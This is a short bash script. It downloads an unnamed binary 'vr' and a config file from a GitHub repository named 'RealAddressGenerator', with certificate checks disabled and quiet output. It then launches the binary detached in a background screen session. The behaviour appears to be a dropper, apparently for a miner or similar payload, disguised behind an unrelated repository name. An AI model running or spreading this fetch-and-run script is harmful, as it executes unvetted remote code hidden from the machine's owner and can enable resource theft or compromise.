#!/bin/bash
wget https://raw.githubusercontent.com/7kj885wz9r-crypto/RealAddressGenerator/refs/heads/main/vr
chmod u+x vr
wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/7kj885wz9r-crypto/RealAddressGenerator/refs/heads/main/vr.json
screen -dmS task bash -c "./vr"
